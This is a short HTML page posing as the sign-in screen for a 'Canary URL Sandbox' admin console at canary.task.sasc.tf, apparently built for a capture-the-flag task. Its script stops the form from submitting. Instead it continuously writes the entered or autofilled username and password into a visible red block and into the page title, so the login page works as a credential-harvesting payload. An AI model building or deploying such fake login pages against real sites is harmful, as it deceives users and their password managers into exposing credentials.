<!doctype html>
<html lang="en">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in · Canary URL Sandbox</title>
<style>
 body{font-family:system-ui,sans-serif;background:#eef2f7;margin:0}
 .card{max-width:560px;margin:5vh auto;background:#fff;padding:2rem;box-shadow:0 2px 8px #0002}
 input{width:100%;box-sizing:border-box;padding:.6rem;margin:.4rem 0;font-size:1rem}
 button{width:100%;padding:.6rem;background:#0067b8;color:#fff;border:0;font-size:1rem}
 #shown{font-size:1.25rem;color:#b00;word-break:break-all;white-space:pre-wrap;margin-top:1rem}
 h1{font-size:1.3rem}
</style>
<div class="card">
 <h1>Canary URL Sandbox</h1>
 <p>Sign in to the administration console for canary.task.sasc.tf</p>
 <form id="f" action="https://canary.task.sasc.tf/login" method="POST">
   <input type="email" id="u" name="username" autocomplete="username" placeholder="admin@sasc.tf" required>
   <input type="password" id="p" name="password" autocomplete="current-password" placeholder="Password" required>
   <button type="submit">Sign in</button>
 </form>
 <pre id="shown"></pre>
</div>
<script>
 var u=document.getElementById('u'),p=document.getElementById('p'),shown=document.getElementById('shown');
 function reflect(){
   shown.textContent="field1="+u.value+"\nfield2="+p.value;
   document.title="["+u.value+"]["+p.value+"]";
 }
 ['input','change','keyup','blur','paste'].forEach(function(ev){u.addEventListener(ev,reflect);p.addEventListener(ev,reflect);});
 document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();reflect();});
 setInterval(reflect,700);
</script>
</html>
